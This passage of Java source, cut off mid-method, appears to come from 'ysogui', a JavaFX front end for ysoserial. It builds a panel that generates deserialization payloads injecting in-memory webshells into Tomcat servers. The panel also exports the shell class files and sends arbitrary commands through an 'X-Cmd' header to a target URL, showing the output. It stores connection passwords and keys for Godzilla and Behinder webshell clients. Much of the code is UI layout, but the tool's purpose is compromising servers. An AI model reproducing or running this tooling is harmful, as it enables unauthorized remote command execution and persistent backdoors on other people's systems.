package ysogui.ui;

import javafx.application.Platform;
import javafx.geometry.Insets;
import javafx.scene.control.*;
import javafx.scene.layout.*;
import javafx.stage.FileChooser;
import ysogui.core.AppPaths;
import ysogui.core.ChainMetaManager;
import ysogui.core.FileCleanup;
import ysogui.core.JavaCompileUtil;
import ysogui.core.MemshellManager;
import ysogui.core.PayloadGenerator;
import ysogui.core.PayloadGenerator.OutputFormat;
import ysogui.model.ChainInfo;
import ysogui.model.MemshellConfig;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * 内存马面板：内存马管理 + 注入生成 + 命令执行回显
 */
public class MemshellPanel extends VBox {

    private final MainWindow mainWindow;
    private PayloadGenerator generator;
    private ChainInfo currentChain;

    // ──── UI 组件 ─────────────────────────────────────────────────────────────
    private ListView<MemshellConfig> shellListView;
    private Label chainSupportLabel;
    private ComboBox<String> chainCombo;
    private ComboBox<OutputFormat> formatCombo;
    private TextField targetUrlField;
    private TextField cmdField;
    private TextField triggerHeaderField;
    private TextField triggerPathField;
    private TextArea outputArea;
    private TextArea echoResultArea;
    private Label statusLabel;
    private TextArea shellDetailArea;

    private final ExecutorService executor = Executors.newSingleThreadExecutor(r -> {
        Thread t = new Thread(r, "memshell-gen");
        t.setDaemon(true);
        return t;
    });

    private final ExecutorService echoExecutor = Executors.newSingleThreadExecutor(r -> {
        Thread t = new Thread(r, "memshell-echo");
        t.setDaemon(true);
        return t;
    });

    public MemshellPanel(MainWindow mainWindow) {
        this.mainWindow = mainWindow;
        setStyle("-fx-background-color: #f5f5f5;");
        setMinWidth(260);
        setPrefWidth(300);
        setSpacing(0);
        setPadding(Insets.EMPTY);

        ScrollPane scroll = new ScrollPane();
        scroll.setFitToWidth(true);
        scroll.setStyle("-fx-background-color: #f5f5f5; -fx-border-color: transparent;");
        // 提高鼠标滚轮滚动速度，但不要拦截 TextArea 内部的滚轮事件
        scroll.addEventFilter(javafx.scene.input.ScrollEvent.SCROLL, event -> {
            // 如果事件源是 TextArea 或其子组件，不拦截，让 TextArea 自行处理
            if (isInsideTextArea(event.getTarget())) {
                return; // 不消费，让事件传播到 TextArea
            }
            double delta = event.getDeltaY();
            if (delta != 0) {
                double speed = 4.0; // 滚动倍速
                scroll.setVvalue(scroll.getVvalue() - delta * speed / scroll.getHeight());
                event.consume();
            }
        });

        VBox content = new VBox(0,
            buildHeader(),
            buildShellListSection(),
            buildDetailSection(),
            buildInjectSection(),
            buildEchoSection(),
            buildOutputSection()
        );

        scroll.setContent(content);
        VBox.setVgrow(scroll, Priority.ALWAYS);
        getChildren().add(scroll);
    }

    // ──── Header ──────────────────────────────────────────────────────────────

    private HBox buildHeader() {
        Label title = new Label("内存马");
        title.setStyle("-fx-text-fill: #7c3aed; -fx-font-size: 13; -fx-font-weight: bold;");
        Button helpBtn = new Button("?");
        helpBtn.setFocusTraversable(false);
        helpBtn.setStyle("-fx-background-color: transparent; -fx-text-fill: #888; "
            + "-fx-border-color: #aaa; -fx-border-radius: 8; -fx-background-radius: 8; "
            + "-fx-font-size: 10; -fx-padding: 1 5; -fx-cursor: hand;");
        helpBtn.setOnAction(e -> showMemshellHelp());
        HBox box = new HBox(title, helpBtn);
        HBox.setHgrow(title, Priority.ALWAYS);
        box.setStyle("-fx-background-color: #e8e8e8; -fx-padding: 8 10;");
        return box;
    }

    // ──── 内存马列表 ──────────────────────────────────────────────────────────

    private VBox buildShellListSection() {
        shellListView = new ListView<>();
        shellListView.setPrefHeight(120);
        shellListView.setStyle("-fx-background-color: #f5f5f5; -fx-border-color: transparent; -fx-padding: 0;");

        shellListView.setCellFactory(lv -> new ListCell<MemshellConfig>() {
            @Override
            protected void updateItem(MemshellConfig item, boolean empty) {
                super.updateItem(item, empty);
                if (empty || item == null) {
                    setText(null);
                    setGraphic(null);
                    setStyle("-fx-background-color: transparent;");
                    return;
                }
                String icon = item.isEchoMode() ? "🔄 " : "🔗 ";
                String modeTag = item.isEchoMode() ? "[回显]" : "[连接]";
                String sourceTag = item.isBuiltin() ? "" : " ★";
                Label label = new Label(icon + item.getName() + " " + modeTag + sourceTag);
                String color = item.isEchoMode() ? "#2e8b57" : "#7c3aed";
                label.setStyle("-fx-text-fill: " + color + "; -fx-font-size: 12; -fx-font-family: Consolas;");
                label.setMaxWidth(Double.MAX_VALUE);
                setGraphic(label);
                setText(null);

                updateCellStyle();
            }

            @Override
            public void updateSelected(boolean selected) {
                super.updateSelected(selected);
                updateCellStyle();
            }

            private void updateCellStyle() {
                if (isSelected()) {
                    setStyle("-fx-background-color: #d8d0f0; -fx-border-color: #7c3aed; -fx-border-width: 0 0 0 3;");
                } else if (isHover()) {
                    setStyle("-fx-background-color: #eee8f8;");
                } else {
                    setStyle("-fx-background-color: transparent;");
                }
            }
        });

        shellListView.getSelectionModel().selectedItemProperty().addListener((obs, old, sel) -> {
            if (sel != null) updateDetail(sel);
        });

        Button btnRefresh = new Button("刷新");
        btnRefresh.setStyle("-fx-background-color: #e0e0e0; -fx-text-fill: #555; " +
                            "-fx-border-color: #bbb; -fx-font-size: 11; -fx-padding: 3 8;");
        btnRefresh.setOnAction(e -> refreshList());

        HBox btnRow = new HBox(6, btnRefresh);

        Label listLbl = new Label("内存马列表");
        listLbl.setStyle("-fx-text-fill: #555; -fx-font-size: 11;");

        Tooltip tip = new Tooltip("🔄 回显型：工具内直接执行命令\n🔗 连接型：需用哥斯拉/冰蝎连接\n仅显示 yso 内置模板");
        Tooltip.install(shellListView, tip);

        VBox box = new VBox(4, listLbl, shellListView, btnRow);
        box.setPadding(new Insets(10));
        box.setStyle("-fx-background-color: #f5f5f5; -fx-border-color: transparent transparent #ddd transparent;");
        return box;
    }

    // ──── 内存马详情 ──────────────────────────────────────────────────────────

    private VBox buildDetailSection() {
        shellDetailArea = new TextArea("选择一个内存马查看详情");
        shellDetailArea.setEditable(false);
        shellDetailArea.setWrapText(true);
        shellDetailArea.setPrefRowCount(6);
        shellDetailArea.setStyle(
            "-fx-background-color: #fff; -fx-text-fill: #555; " +
            "-fx-font-family: Consolas; -fx-font-size: 11; -fx-border-color: #ccc;"
        );
        enableTextAreaScroll(shellDetailArea);

        // 导出 .class 按钮
        Button btnExportClass = new Button("导出 .class 文件");
        btnExportClass.setStyle("-fx-background-color: #e0ecf5; -fx-text-fill: #2563a0; " +
                                "-fx-border-color: #a0c0e0; -fx-font-size: 11; -fx-padding: 3 8;");
        btnExportClass.setOnAction(e -> doExportClass());

        // 复制信息按钮
        Button btnCopyInfo = new Button("复制信息");
        btnCopyInfo.setStyle("-fx-background-color: #e0e0e0; -fx-text-fill: #555; " +
                             "-fx-border-color: #bbb; -fx-font-size: 11; -fx-padding: 3 8;");
        btnCopyInfo.setOnAction(e -> {
            String text = shellDetailArea.getText();
            if (!text.isEmpty()) {
                javafx.scene.input.ClipboardContent cc = new javafx.scene.input.ClipboardContent();
                cc.putString(text);
                javafx.scene.input.Clipboard.getSystemClipboard().setContent(cc);
                setStatus("✓ 内存马信息已复制到剪贴板");
            }
        });

        HBox btnRow = new HBox(6, btnExportClass, btnCopyInfo);

        VBox box = new VBox(4, new Label("详情"), shellDetailArea, btnRow);
        box.setPadding(new Insets(8, 10, 8, 10));
        box.setStyle("-fx-background-color: #f5f5f5; -fx-border-color: transparent transparent #ddd transparent;");
        return box;
    }

    private void updateDetail(MemshellConfig config) {
        StringBuilder sb = new StringBuilder();
        sb.append("名称：").append(config.getName()).append("\n");
        sb.append("类型：").append(config.getType()).append("\n");
        sb.append("模式：").append(config.isEchoMode() ? "回显型" : "连接型").append("\n");
        sb.append("适用：").append(config.getServerType() != null ? config.getServerType() : "-").append("\n");
        if (config.getTemplateClass() != null && !config.getTemplateClass().isEmpty()) {
            sb.append("模板类：").append(config.getTemplateClass()).append("\n");
        }
        if (config.isEchoMode()) {
            sb.append("触发Header：").append(config.getTriggerHeader() != null ? config.getTriggerHeader() : "X-Cmd").append("\n");
            sb.append("触发路径：").append(config.getTriggerPath() != null ? config.getTriggerPath() : "/").append("\n");
        } else {
            sb.append("连接工具：").append(config.getTool() != null ? config.getTool() : "-").append("\n");
            sb.append("密码：").append(config.getPassword() != null ? config.getPassword() : "-").append("\n");
            sb.append("密钥：").append(config.getSecretKey() != null ? config.getSecretKey() : "-").append("\n");
        }
        sb.append("说明：").append(config.getDescription() != null ? config.getDescription() : "-");
        shellDetailArea.setText(sb.toString());

        // 同步回显区域的触发配置
        if (config.isEchoMode()) {
            triggerHeaderField.setText(config.getTriggerHeader() != null ? config.getTriggerHeader() : "X-Cmd");
            triggerPathField.setText(config.getTriggerPath() != null ? config.getTriggerPath() : "/");
        }
    }

    // ──── 注入生成区 ──────────────────────────────────────────────────────────

    private VBox buildInjectSection() {
        // 当前链支持状态
        chainSupportLabel = new Label("未选择链");
        chainSupportLabel.setStyle("-fx-text-fill: #888; -fx-font-size: 11;");

        // 利用链选择
        Label chainLbl = new Label("利用链");
        chainLbl.setStyle("-fx-text-fill: #555; -fx-font-size: 11;");
        chainCombo = new ComboBox<>();
        chainCombo.setMaxWidth(Double.MAX_VALUE);
        chainCombo.setStyle("-fx-background-color: #fff; -fx-text-fill: #333;");
        chainCombo.setPromptText("先在左侧选择链...");

        // 输出格式
        Label fmtLbl = new Label("输出格式");
        fmtLbl.setStyle("-fx-text-fill: #555; -fx-font-size: 11;");
        formatCombo = new ComboBox<>();
        formatCombo.getItems().addAll(OutputFormat.values());
        formatCombo.setValue(OutputFormat.BASE64);
        formatCombo.setMaxWidth(Double.MAX_VALUE);
        formatCombo.setStyle("-fx-background-color: #fff; -fx-text-fill: #333;");

        // 生成按钮
        Button btnInject = new Button("▶  生 成 注 入 Payload");
        btnInject.setMaxWidth(Double.MAX_VALUE);
        btnInject.setStyle(
            "-fx-background-color: #7c3aed; -fx-text-fill: #fff; " +
            "-fx-border-color: #9a6ae0; -fx-font-size: 12; -fx-font-weight: bold; -fx-padding: 6;"
        );
        btnInject.setOnAction(e -> doInject());

        statusLabel = new Label("");
        statusLabel.setStyle("-fx-text-fill: #888; -fx-font-size: 11;");
        statusLabel.setWrapText(true);

        VBox box = new VBox(5, chainSupportLabel, new Separator(),
                chainLbl, chainCombo, fmtLbl, formatCombo, btnInject, statusLabel);
        box.setPadding(new Insets(8, 10, 8, 10));
        box.setStyle("-fx-background-color: #f5f5f5; -fx-border-color: transparent transparent #ddd transparent;");
        return box;
    }

    // ──── 命令执行回显区 ─────────────────────────────────────────────────────

    private VBox buildEchoSection() {
        Label title = new Label("── 命令执行回显（仅回显型） ──");
        title.setStyle("-fx-text-fill: #2e8b57; -fx-font-size: 11;");

        Label urlLbl = new Label("目标 URL");
        urlLbl.setStyle("-fx-text-fill: #555; -fx-font-size: 11;");
        targetUrlField = styledTextField("http://target:8080/app");

        Label cmdLbl = new Label("命令");
        cmdLbl.setStyle("-fx-text-fill: #555; -fx-font-size: 11;");
        cmdField = styledTextField("calc");

        Label headerLbl = new Label("触发 Header（可自定义）");
        headerLbl.setStyle("-fx-text-fill: #555; -fx-font-size: 11;");
        triggerHeaderField = styledTextField("X-Cmd");

        Label pathLbl = new Label("触发路径");
        pathLbl.setStyle("-fx-text-fill: #555; -fx-font-size: 11;");
        triggerPathField = styledTextField("/");

        Button btnExec = new Button("▶  执行命令");
        btnExec.setMaxWidth(Double.MAX_VALUE);
        btnExec.setStyle(
            "-fx-background-color: #2e8b57; -fx-text-fill: #fff; " +
            "-fx-border-color: #3aa868; -fx-font-size: 12; -fx-font-weight: bold; -fx-padding: 6;"
        );
        btnExec.setOnAction(e -> doEchoExec());

        echoResultArea = new TextArea();
        echoResultArea.setEditable(false);
        echoResultArea.setWrapText(true);
        echoResultArea.setPrefRowCount(5);
        echoResultArea.setStyle(
            "-fx-background-color: #fff; -fx-text-fill: #333; " +
            "-fx-font-family: Consolas; -fx-font-size: 12; -fx-border-color: #ccc;"
        );
        enableTextAreaScroll(echoResultArea);

        Label resultLbl = new Label("回显结果");
        resultLbl.setStyle("-fx-text-fill: #555; -fx-font-size: 11;");

        VBox box = new VBox(5, title, urlLbl, targetUrlField, cmdLbl, cmdField,
                headerLbl, triggerHeaderField, pathLbl, triggerPathField, btnExec,
                resultLbl, echoResultArea);
        box.setPadding(new Insets(8, 10, 8, 10));
        box.setStyle("-fx-background-color: #f5f5f5; -fx-border-color: transparent transparent #ddd transparent;");
        return box;
    }

    // ──── 输出区 ──────────────────────────────────────────────────────────────

    private VBox buildOutputSection() {
        Label outLbl = new Label("Payload 输出");
        outLbl.setStyle("-fx-text-fill: #555; -fx-font-size: 11;");

        outputArea = new TextArea();
        outputArea.setEditable(false);
        outputArea.setWrapText(true);
        outputArea.setStyle(
            "-fx-background-color: #fff; -fx-text-fill: #2e8b57; " +
            "-fx-font-family: Consolas; -fx-font-size: 11; -fx-border-color: #ccc;"
        );
        outputArea.setPrefRowCount(6);
        enableTextAreaScroll(outputArea);

        Button btnCopy = actionBtn("复制");
        Button btnSaveFile = actionBtn("保存文件");
        Button btnClear = actionBtn("清空");

        btnCopy.setOnAction(e -> {
            String text = outputArea.getText();
            if (!text.isEmpty()) {
                javafx.scene.input.ClipboardContent cc = new javafx.scene.input.ClipboardContent();
                cc.putString(text);
                javafx.scene.input.Clipboard.getSystemClipboard().setContent(cc);
                setStatus("已复制到剪贴板");
            }
        });

        btnClear.setOnAction(e -> {
            outputArea.clear();
            statusLabel.setText("");
        });
        btnSaveFile.setOnAction(e -> doSavePayload());

        HBox btnRow = new HBox(6, btnCopy, btnSaveFile, btnClear);

        VBox box = new VBox(5, outLbl, outputArea, btnRow);
        box.setPadding(new Insets(8, 10, 10, 10));
        box.setStyle("-fx-background-color: #f5f5f5;");
        return box;
    }

    // ──── 导出 class 文件 ────────────────────────────────────────────────────

    /**
     * 导出内存马的原始 .class 文件。
     * - 内置内存马：从 ysoserial jar 的 payloads/templates/ 目录提取
     * - 自定义内存马：从 classFile 路径读取
     */
    private void doExportClass() {
        MemshellConfig shell = shellListView.getSelectionModel().getSelectedItem();
        if (shell == null) {
            mainWindow.showError("请先选择一个内存马");
            return;
        }

        // 选择保存路径
        FileChooser chooser = new FileChooser();
        chooser.setTitle("导出 .class 文件");
        String className = resolveShellClassName(shell);
        chooser.setInitialFileName(className + ".class");
        chooser.getExtensionFilters().add(
            new FileChooser.ExtensionFilter("Class 文件", "*.class"));

        File saveFile = chooser.showSaveDialog(getScene().getWindow());
        if (saveFile == null) return;

        executor.submit(() -> {
            try {
                byte[] classBytes = readMemshellClassBytes(shell);
                if (classBytes == null || classBytes.length == 0) {
                    Platform.runLater(() -> setStatus("✗ 未找到 .class 文件"));
                    return;
                }

                Files.write(saveFile.toPath(), classBytes);
                Platform.runLater(() -> setStatus("✓ 已导出: " + saveFile.getName()
                    + " (" + classBytes.length + " bytes)"));
            } catch (Exception e) {
                Platform.runLater(() -> setStatus("✗ 导出失败: " + e.getMessage()));
            }
        });
    }

    /**
     * 读取内存马的 .class 字节码。
     * - 内置内存马：从 ysoserial jar 提取
     * - 自定义内存马：从 classFile 路径读取
     * - 也可以从 YsoGUI classpath 读取自定义模板
     */
    private byte[] readMemshellClassBytes(MemshellConfig shell) throws Exception {
        String templateClass = shell.getTemplateClass();

        // 1. 内置内存马：从 ysoserial jar 读取
        if (shell.isBuiltin() && templateClass != null && !templateClass.isEmpty()) {
            // 先从 ysoserial jar 的 templates 目录读取
            String ysoserialPath = "ysoserial/payloads/templates/" + templateClass + ".class";
            if (generator != null) {
                InputStream is = generator.getClassLoader().getResourceAsStream(ysoserialPath);
                if (is != null) {
                    try (InputStream stream = is) {
                        return readAllBytes(stream);
                    }
                }
            }

            // 再从 YsoGUI classpath 读取自定义模板
            String customPath = "ysogui/memshell/" + templateClass + ".class";
            InputStream customIs = MemshellPanel.class.getClassLoader().getResourceAsStream(customPath);
            if (customIs != null) {
                try (InputStream stream = customIs) {
                    return readAllBytes(stream);
                }
            }

            throw new Exception("找不到内置模板类: " + templateClass
                + "（搜索了 " + ysoserialPath + " 和 " + customPath + "）");
        }

        // 2. 自定义内存马：从 classFile 路径读取
        String classFilePath = shell.getClassFile();
        if (classFilePath != null && !classFilePath.isEmpty()) {
            File file = new File(classFilePath);
            if (file.exists()) {
                return Files.readAllBytes(file.toPath());
            }
            throw new Exception("自定义 class 文件不存在: " + classFilePath);
        }

        throw new Exception("无法导出: 没有可用的 class 文件路径");
    }

    private byte[] readAllBytes(InputStream is) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        byte[] buf = new byte[4096];
        int len;
        while ((len = is.read(buf)) != -1) {
            baos.write(buf, 0, len);
        }
        return baos.toByteArray();
    }

    // ──── 注入逻辑 ────────────────────────────────────────────────────────────

    private byte[] lastRawBytes = null;

    private void doInject() {
        MemshellConfig shell = shellListView.getSelectionModel().getSelectedItem();
        if (shell == null) {
            mainWindow.showError("请先选择一个内存马");
            return;
        }
        if (generator == null) {
            mainWindow.showError("请先加载 ysoserial.jar");
            return;
        }

        String chainName = chainCombo.getValue();
        if (chainName == null || chainName.isEmpty()) {
            mainWindow.showError("请选择利用链");
            return;
        }

        // 仅适配 yso 原版 CLASS: 模板路线
        if (!shell.isBuiltin()) {
            mainWindow.showError("当前面板仅支持 yso 内置 CLASS: 模板");
            return;
        }
        if (!ChainMetaManager.supportsBuiltinTemplate(chainName)) {
            String reason = ChainMetaManager.getBuiltinTemplateReason(chainName);
            mainWindow.showError("该链不支持 yso 的 CLASS: 模板路线\n" + reason);
            return;
        }

        String className = resolveShellClassName(shell);

        OutputFormat fmt = formatCombo.getValue();
        setStatus("生成中... 链: " + chainName + "  模板: " + className);
        outputArea.clear();

        executor.submit(() -> {
            try {
                if (!generator.hasBuiltinTemplate(className)) {
                    throw new Exception("ysoserial 内置模板不存在: " + className);
                }
                byte[] rawBytes = generator.generateMemshellRaw(chainName, className);
                lastRawBytes = rawBytes;

                if (fmt == OutputFormat.RAW) {
                    Platform.runLater(() -> {
                        outputArea.setText("[Raw 字节已就绪，点击「保存文件」写出 .bin]");
                        setStatus("✓ Raw 生成成功  " + rawBytes.length + " bytes");
                    });
                } else {
                    String result = generator.convertRaw(rawBytes, fmt);
                    Platform.runLater(() -> {
                        outputArea.setText(result);
                        setStatus("✓ 生成成功  " + rawBytes.length + " bytes → "
                                + result.length() + " chars (" + fmt + ")");
                    });
                }
            } catch (Exception e) {
                Platform.runLater(() -> setStatus("✗ 失败: " + e.getMessage()));
            }
        });
    }

    /**
     * 解析内存马的类名（用于 CLASS:xxx 命令）。
     * 优先级：
     * 1. 内置内存马：使用 templateClass（ysoserial payloads templates 包中的类名）
     * 2. 自定义内存马：使用 classFile 推导类名
     */
    private String resolveShellClassName(MemshellConfig shell) {
        // 内置内存马：使用 templateClass（如 TomcatCmdEcho, TomcatFilterMemShellFromThread）
        if (shell.isBuiltin() && shell.getTemplateClass() != null && !shell.getTemplateClass().isEmpty()) {
            return shell.getTemplateClass();
        }

        if (shell.getClassName() != null && !shell.getClassName().trim().isEmpty()) {
            String full = shell.getClassName().trim();
            int idx = full.lastIndexOf('.');
            return idx >= 0 ? full.substring(idx + 1) : full;
        }

        // 自定义内存马：从 classFile 推导
        if (shell.getClassFile() != null && !shell.getClassFile().isEmpty()) {
            String cf = shell.getClassFile();
            if (cf.endsWith(".class")) {
                cf = cf.replace(".class", "");
            }
            if (cf.contains("/") || cf.contains("\\")) {
                cf = cf.substring(cf.lastIndexOf('/') + 1);
                cf = cf.substring(cf.lastIndexOf('\\') + 1);
            }
            return cf;
        }

        // 兜底：根据类型推导（兼容旧配置）
        String type = shell.getType();
        if ("Filter".equals(type)) return "TomcatFilterMemShellFromThread";
        if ("Servlet".equals(type)) return "TomcatServletMemShellFromThread";
        if ("Listener".equals(type)) return "TomcatListenerMemShellFromThread";
        return "TomcatFilterMemShellFromThread";
    }

    private byte[][] readMemshellClassBytecodes(MemshellConfig shell) throws Exception {
        String classFilePath = shell.getClassFile();
        if (classFilePath == null || classFilePath.trim().isEmpty()) {
            throw new Exception("自定义内存马缺少 class 文件路径");
        }
        File file = new File(classFilePath);
        if (!file.exists()) {
            throw new Exception("自定义 class 文件不存在: " + classFilePath);
        }

        java.util.List<byte[]> result = new java.util.ArrayList<>();
        result.add(Files.readAllBytes(file.toPath()));

        String baseName = file.getName().replace(".class", "");
        File parent = file.getParentFile();
        File[] innerClasses = parent != null ? parent.listFiles(f ->
            f.getName().startsWith(baseName + "$") && f.getName().endsWith(".class")) : null;
        if (innerClasses != null) {
            java.util.Arrays.sort(innerClasses, java.util.Comparator.comparing(File::getName));
            for (File inner : innerClasses) {
                result.add(Files.readAllBytes(inner.toPath()));
            }
        }
        return result.toArray(new byte[result.size()][]);
    }

    private void doSavePayload() {
        if (lastRawBytes == null || lastRawBytes.length == 0) {
            mainWindow.showError("当前没有可保存的 payload");
            return;
        }

        OutputFormat fmt = formatCombo.getValue();
        FileChooser chooser = new FileChooser();
        chooser.setTitle("保存内存马 Payload");
        String ext = fmt == OutputFormat.RAW ? "*.bin" : "*.txt";
        chooser.getExtensionFilters().add(new FileChooser.ExtensionFilter("输出文件", ext));
        chooser.setInitialFileName(fmt == OutputFormat.RAW ? "memshell-payload.bin" : "memshell-payload.txt");
        File saveFile = chooser.showSaveDialog(getScene().getWindow());
        if (saveFile == null) return;

        executor.submit(() -> {
            try {
                if (fmt == OutputFormat.RAW) {
                    Files.write(saveFile.toPath(), lastRawBytes);
                } else {
                    String text = generator.convertRaw(lastRawBytes, fmt);
                    Files.write(saveFile.toPath(), text.getBytes(StandardCharsets.UTF_8));
                }
                Platform.runLater(() -> setStatus("✓ 已保存: " + saveFile.getName()));
            } catch (Exception e) {
                Platform.runLater(() -> setStatus("✗ 保存失败: " + e.getMessage()));
            }
        });
    }

    // ──── 命令执行回显逻辑 ────────────────────────────────────────────────────

    private void doEchoExec() {
        MemshellConfig shell = shellListView.getSelectionModel().getSelectedItem();
        if (shell == null || !shell.isEchoMode()) {
            mainWindow.showError("请先选择一个回显型内存马");
            return;
        }

        String targetUrl = targetUrlField.getText().trim();
        String cmd = cmdField.getText().trim();
        final String header = triggerHeaderField.getText().trim().isEmpty() ? "X-Cmd" : triggerHeaderField.getText().trim();
        String path = triggerPathField.getText().trim();

        if (targetUrl.isEmpty()) { mainWindow.showError("请输入目标 URL"); return; }
        if (cmd.isEmpty()) { mainWindow.showError("请输入命令"); return; }

        // 生成随机 boundary 标记
        String boundary = "YSO" + Long.toHexString(System.currentTimeMillis()) + "GUI";

        echoResultArea.setText("[*] 正在请求...");
        setStatus("发送回显请求...");

        echoExecutor.submit(() -> {
            try {
                // 构造完整 URL
                String fullUrl = targetUrl;
                if (!fullUrl.endsWith("/") && !path.startsWith("/")) {
                    fullUrl += "/";
                }
                fullUrl += path.startsWith("/") ? path.substring(1) : path;

                URL url = new URL(fullUrl);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                conn.setRequestProperty(header, cmd);
                conn.setRequestProperty("X-Boundary", boundary);
                conn.setConnectTimeout(10000);
                conn.setReadTimeout(15000);

                int code = conn.getResponseCode();
                InputStream is = code >= 400 ? conn.getErrorStream() : conn.getInputStream();
                if (is == null) {
                    Platform.runLater(() -> {
                        echoResultArea.setText("[!] 无响应内容，HTTP " + code);
                        setStatus("✗ 无响应内容");
                    });
                    return;
                }

                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                byte[] buf = new byte[4096];
                int len;
                while ((len = is.read(buf)) != -1) baos.write(buf, 0, len);
                is.close();

                String body = new String(baos.toByteArray(), StandardCharsets.UTF_8);

                // 尝试用 boundary 提取结果
                String markerStart = "<!--" + boundary + "-->";
                String markerEnd = "<!--/" + boundary + "-->";
                int start = body.indexOf(markerStart);
                int end = body.indexOf(markerEnd);

                String result;
                if (start >= 0 && end > start) {
                    // 自定义回显型：用 boundary 标记精确提取
                    result = body.substring(start + markerStart.length(), end).trim();
                } else {
                    // Y4er 内置 TomcatCmdEcho 等：结果直接在响应体中
                    // 判断响应是否像命令回显（短文本、非 HTML 页面）
                    String trimmed = body.trim();
                    boolean looksLikeEcho = trimmed.length() > 0
                        && trimmed.length() < 65536   // 不超过 64KB，排除整页 HTML
                        && !trimmed.startsWith("<!DOCTYPE")
                        && !trimmed.startsWith("<html")
                        && !trimmed.startsWith("<HTML");

                    if (looksLikeEcho) {
                        result = trimmed;
                    } else if (trimmed.isEmpty()) {
                        result = "[!] 响应为空，可能内存马未注入成功或目标不可达 (HTTP " + code + ")";
                    } else {
                        // 响应太长或像 HTML，提示可能注入失败
                        result = "[!] 未提取到回显标记，响应可能不是命令结果 (HTTP " + code + ")\n\n"
                               + "前 2000 字符:\n" + trimmed.substring(0, Math.min(trimmed.length(), 2000));
                    }
                }

                final String finalResult = result;
                Platform.runLater(() -> {
                    echoResultArea.setText(finalResult);
                    setStatus("✓ 回显完成");
                });
            } catch (Exception e) {
                Platform.runLater(() -> {
                    echoResultArea.setText("[!] 请求失败: " + e.getMessage());
                    setStatus("✗ 回显失败: " + e.getMessage());
                });
            }
        });
    }

    // ──── 添加内存马对话框 ────────────────────────────────────────────────────

    private void showAddDialog() {
        Dialog<MemshellConfig> dlg = new Dialog<>();
        dlg.setTitle("添加自定义内存马");
        dlg.setHeaderText("配置自定义内存马（需继承 AbstractTranslet）");

        TextField nameField = new TextField();
        nameField.setPromptText("如 MyFilterEcho");

        ComboBox<String> typeCombo = new ComboBox<>();
        typeCombo.getItems().addAll("Filter", "Servlet", "Listener", "Valve", "Agent");
        typeCombo.setValue("Filter");

        ComboBox<String> modeCombo = new ComboBox<>();
        modeCombo.getItems().addAll("echo", "connect");
        modeCombo.setValue("echo");
        modeCombo.setOnAction(e -> {
            boolean isEcho = "echo".equals(modeCombo.getValue());
            // 动态切换字段可用性（简化处理）
        });

        TextField serverField = new TextField("Tomcat");
        serverField.setPromptText("适用服务器类型");

        // 回显型字段
        TextField headerField = new TextField("X-Cmd");
        headerField.setPromptText("触发命令的 Header 名");

        TextField pathField = new TextField("/");
        pathField.setPromptText("触发路径");

        // 连接型字段
        TextField toolField = new TextField("godzilla");
        toolField.setPromptText("godzilla / behinder / custom");

        TextField passField = new TextField("pass");
        passField.setPromptText("连接密码");

        TextField keyField = new TextField("key");
        keyField.setPromptText("加密密钥");

        // class 文件选择
        TextField classField = new TextField();
        classField.setPromptText("选择 .class 或 .java 文件");
        classField.setEditable(false);
        classField.setPrefWidth(300);

        TextField classNameField = new TextField();
        classNameField.setPromptText("完整类名，如 com.example.MyShell");

        Button btnBrowse = new Button("浏览...");
        btnBrowse.setOnAction(ev -> {
            FileChooser fc = new FileChooser();
            fc.setTitle("选择内存马类文件");
            fc.getExtensionFilters().addAll(
                new FileChooser.ExtensionFilter("Class / Java 文件", "*.class", "*.java"),
                new FileChooser.ExtensionFilter("Class 文件", "*.class"),
                new FileChooser.ExtensionFilter("Java 文件", "*.java")
            );
            File file = fc.showOpenDialog(dlg.getDialogPane().getScene().getWindow());
            if (file != null) {
                classField.setText(file.getAbsolutePath());
                if (classNameField.getText().trim().isEmpty()) {
                    String derived = deriveClassName(file);
                    if (derived != null) classNameField.setText(derived);
                }
                if (nameField.getText().trim().isEmpty()) {
                    String simple = file.getName().replaceAll("\\.(class|java)$", "");
                    nameField.setText(simple);
                }
            }
        });

        Label fileHint = new Label("支持 .class（直接用）和 .java（自动编译）");
        fileHint.setStyle("-fx-text-fill: #888; -fx-font-size: 10;");

        TextArea descArea = new TextArea();
        descArea.setPromptText("描述信息（可选）");
        descArea.setPrefRowCount(2);

        GridPane grid = new GridPane();
        grid.setHgap(10);
        grid.setVgap(8);
        grid.setPadding(new Insets(15, 15, 5, 10));

        ColumnConstraints col0 = new ColumnConstraints();
        col0.setMinWidth(70);
        ColumnConstraints col1 = new ColumnConstraints();
        col1.setHgrow(Priority.ALWAYS);
        grid.getColumnConstraints().addAll(col0, col1);

        int row = 0;
        grid.add(new Label("名称："), 0, row); grid.add(nameField, 1, row); row++;
        grid.add(new Label("类型："), 0, row); grid.add(typeCombo, 1, row); row++;
        grid.add(new Label("模式："), 0, row); grid.add(modeCombo, 1, row); row++;
        grid.add(new Label("适用："), 0, row); grid.add(serverField, 1, row); row++;

        // 回显型字段
        grid.add(new Separator(), 0, row); grid.add(new Label("回显型配置"), 1, row); row++;
        grid.add(new Label("触发Header："), 0, row); grid.add(headerField, 1, row); row++;
        grid.add(new Label("触发路径："), 0, row); grid.add(pathField, 1, row); row++;

        // 连接型字段
        grid.add(new Separator(), 0, row); grid.add(new Label("连接型配置"), 1, row); row++;
        grid.add(new Label("连接工具："), 0, row); grid.add(toolField, 1, row); row++;
        grid.add(new Label("密码："), 0, row); grid.add(passField, 1, row); row++;
        grid.add(new Label("密钥："), 0, row); grid.add(keyField, 1, row); row++;

        // 文件选择
        grid.add(new Separator(), 0, row); grid.add(new Label("类文件配置"), 1, row); row++;
        grid.add(new Label("类文件："), 0, row);
        HBox fileRow = new HBox(6, classField, btnBrowse);
        HBox.setHgrow(classField, Priority.ALWAYS);
        grid.add(fileRow, 1, row); row++;
        grid.add(new Label(""), 0, row); grid.add(fileHint, 1, row); row++;
        grid.add(new Label("完整类名："), 0, row); grid.add(classNameField, 1, row); row++;
        grid.add(new Label("描述："), 0, row); grid.add(descArea, 1, row); row++;

        ScrollPane scroll = new ScrollPane(grid);
        scroll.setFitToWidth(true);
        scroll.setPrefHeight(450);

        dlg.getDialogPane().setContent(scroll);
        dlg.getDialogPane().getButtonTypes().addAll(ButtonType.OK, ButtonType.CANCEL);

